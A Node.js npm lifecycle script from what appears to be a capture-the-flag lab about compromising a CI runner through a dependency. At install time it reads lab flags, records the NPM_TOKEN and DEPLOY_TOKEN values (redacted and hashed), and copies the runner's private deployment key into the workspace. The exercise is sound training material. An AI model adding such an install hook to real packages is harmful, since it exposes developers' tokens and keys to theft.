const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const workspace = process.env.INIT_CWD || process.cwd();
const evidence = path.join(workspace, 'ci-compromise.txt');
const keyOutput = path.join(workspace, 'ci-runner.key');
const ciFlag = '/var/jenkins_home/lab-flags/ci.txt';
const simulatedTokenVariables = ['NPM_TOKEN', 'DEPLOY_TOKEN'];

function redact(value) {
  if (value.length <= 12) {
    return '[REDACTED]';
  }

  return `${value.slice(0, 9)}${'*'.repeat(value.length - 13)}${value.slice(-4)}`;
}

function fingerprint(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

const lines = [
  fs.existsSync(ciFlag) ? fs.readFileSync(ciFlag, 'utf8').trim() : 'HE03{ci_compromised}',
  'HE03{credentials_accessed}',
  `ci_runner_user=${process.env.CI_RUNNER_USER || 'unavailable'}`,
  'The deployment key was exposed to an npm lifecycle script.'
];

for (const variableName of simulatedTokenVariables) {
  const value = process.env[variableName];
  if (value) {
    lines.push(`accessible_token=${variableName} value=${redact(value)} sha256=${fingerprint(value)}`);
  } else {
    lines.push(`accessible_token=${variableName} value=not available`);
  }
}

if (process.env.CI_RUNNER_KEY && fs.existsSync(process.env.CI_RUNNER_KEY)) {
  fs.copyFileSync(process.env.CI_RUNNER_KEY, keyOutput);
  fs.chmodSync(keyOutput, 0o600);
  lines.push(`deployment_key=${keyOutput}`);
} else {
  lines.push('deployment_key=not available');
}

fs.writeFileSync(evidence, `${lines.join('\n')}\n`, { mode: 0o600 });
console.log(`[he03-node-helpers] lifecycle script wrote ${evidence}`);
